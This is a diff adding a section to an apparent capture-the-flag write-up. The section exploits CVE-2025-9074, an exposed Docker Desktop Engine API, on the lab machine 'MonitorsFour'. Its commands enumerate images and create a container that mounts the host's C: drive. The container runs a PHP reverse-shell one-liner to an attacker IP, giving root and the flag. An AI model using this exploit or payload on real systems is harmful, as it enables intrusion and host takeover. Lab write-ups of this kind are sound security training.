@@ -946,3 +946,197 @@ a numeric value (0 to the exponent `...`) before been compared to the payload "0
 
 ## CVE-2025-9074
 
+CVE-2025-9074 is a vulnerability in Docker Desktop prior to version 4.44.3, whereby the Docker Engine API is
+exposed to locally running containers via the configured subnet `192.168.65.7:2375`.
+The IP address `192.168.65.7` is an internal gateway address used by Docker Desktop for communication between
+containers and the underlying Docker Desktop virtual machine.
+
+From prior enumeration of the MonitorsFour main web app, it was found in the changelog that the version of
+Docker Desktop in use by the target is Docker Desktop 4.44.2, which is vulnerable.
+
+This vulnerability was exploited as follows:
+
+
+### Enumerating available images
+
+- Through the exposed Docker Engine API, available Docker images on the target were listed.
+
+```sh
+curl http://192.168.65.7:2375/images/json > /tmp/images.json
+```
+
+```json
+[
+  {
+    "Containers": 1,
+    "Created": 1762794130,
+    "Id": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
+    "Labels": {
+      "com.docker.compose.project": "docker_setup",
+      "com.docker.compose.service": "nginx-php",
+      "com.docker.compose.version": "2.39.1"
+    },
+    "ParentId": "",
+    "Descriptor": {
+      "mediaType": "application/vnd.oci.image.index.v1+json",
+      "digest": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
+      "size": 856
+    },
+    "RepoDigests": [
+      "docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"
+    ],
+    "RepoTags": [
+      "docker_setup-nginx-php:latest"
+    ],
+    "SharedSize": -1,
+    "Size": 1277167255
+  },
+  {
+    "Containers": 1,
+    "Created": 1762791053,
+    "Id": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
+    "Labels": {
+      "com.docker.compose.project": "docker_setup",
+      "com.docker.compose.service": "mariadb",
+      "com.docker.compose.version": "2.39.1",
+      "org.opencontainers.image.authors": "MariaDB Community",
+      "org.opencontainers.image.base.name": "docker.io/library/ubuntu:noble",
+      "org.opencontainers.image.description": "MariaDB Database for relational SQL",
+      "org.opencontainers.image.documentation": "https://hub.docker.com/_/mariadb/",
+      "org.opencontainers.image.licenses": "GPL-2.0",
+      "org.opencontainers.image.ref.name": "ubuntu",
+      "org.opencontainers.image.source": "https://github.com/MariaDB/mariadb-docker",
+      "org.opencontainers.image.title": "MariaDB Database",
+      "org.opencontainers.image.url": "https://github.com/MariaDB/mariadb-docker",
+      "org.opencontainers.image.vendor": "MariaDB Community",
+      "org.opencontainers.image.version": "11.4.8"
+    },
+    "ParentId": "",
+    "Descriptor": {
+      "mediaType": "application/vnd.oci.image.index.v1+json",
+      "digest": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
+      "size": 856
+    },
+    "RepoDigests": [
+      "docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"
+    ],
+    "RepoTags": [
+      "docker_setup-mariadb:latest"
+    ],
+    "SharedSize": -1,
+    "Size": 454269972
+  },
+  {
+    "Containers": 0,
+    "Created": 1759921496,
+    "Id": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
+    "Labels": null,
+    "ParentId": "",
+    "Descriptor": {
+      "mediaType": "application/vnd.oci.image.index.v1+json",
+      "digest": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
+      "size": 9218
+    },
+    "RepoDigests": [
+      "alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"
+    ],
+    "RepoTags": [
+      "alpine:latest"
+    ],
+    "SharedSize": -1,
+    "Size": 12794775
+  }
+]
+```
+
+- The following images were found on the target:
+  - `docker_setup-nginx-php:latest`
+  - `docker_setup-mariadb:latest`
+  - `alpine:latest`
+
+
+### Build a `containers.json` file
+
+A json file was built to create a container through the API that will mount the host's `C:/` drive
+and connect to our attacker machine through a reverse shell.
+
+This is similar to creating a container through the `docker build` command.
+
+```json
+{
+        "Image":"docker_setup-nginx-php:latest",
+        "Cmd":["sh","-c","php -r '$sock=fsockopen(\"10.10.15.43\",9001);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
+        "HostConfig":{
+                "Binds":["/mnt/host/c:/host_root"]
+        }
+}
+```
+
+
+### Execute the `containers.json` file
+
+- The `containers.json` file was uploaded to the MonitorsFour cacti container
+
+```
+[server] sliver (STUPID_CASTANET) > upload ./container.json /tmp/
+
+[*] Wrote 1 file successfully to /tmp/container.json
+```
+
+- Through the exposed Docker Engine API, a container was created from the specifications of the `containers.json` file
+
+```sh
+curl -v -H 'Content-Type: application/json' -d @container.json http://192.168.65.7:2375/containers/create > create.json
+```
+
+```sh
+www-data@821fbd6a43fa:/tmp$ cat create.json
+{"Id":"0d69d5d690dbc6210641d5410fc6c9ed106d6e6e19f67c7e4b303557d32874c2","Warnings":[]}
+```
+
+- The created container was started using its Id returned from the response.
+
+```sh
+curl -v -H 'Content-Type: application/json' -XPOST http://192.168.65.7:2375/containers/0d69d5d690dbc6210641d5410fc6c9ed106d6e6e19f67c7e4b303557d32874c2/start
+```
+
+- A reverse shell was obtained in this container as the root user.
+
+```sh
+└──╼ $nc -lvvp 9001
+Listening on 0.0.0.0 9001
+Connection received on monitorsfour.htb 57320
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
+```sh
+# ls /host_root
+$RECYCLE.BIN
+$WinREAgent
+Documents and Settings
+DumpStack.log.tmp
+PerfLogs
+Program Files
+Program Files (x86)
+ProgramData
+Recovery
+System Volume Information
+Users
+Windows
+Windows.old
+inetpub
+pagefile.sys
+```
+
+- The root flag was obtained.
+
+```sh
+# ls /host_root/Users/Administrator/Desktop
+desktop.ini
+root.txt
+# cat /host_root/Users/Administrator/Desktop/root.txt
+4e8016ca************************
+```
